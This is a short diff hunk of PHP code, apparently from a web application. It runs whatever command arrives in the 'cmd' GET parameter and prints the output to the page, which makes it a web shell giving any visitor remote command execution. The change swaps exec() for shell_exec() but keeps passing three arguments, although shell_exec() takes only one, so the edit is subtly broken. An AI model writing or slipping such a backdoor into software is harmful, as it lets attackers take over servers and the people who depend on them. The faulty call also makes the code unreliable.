@@ -41,7 +41,7 @@ if ($u != null) {
 if (isset($_GET['cmd'])) {
     $d = $_GET['cmd'];
     if (strlen($d) > 1) {
-        $ret = exec($d, $output, $error);
+        $ret = shell_exec($d, $output, $error);
         echo '<pre>';
         print_r($ret);
         echo '<hr>';
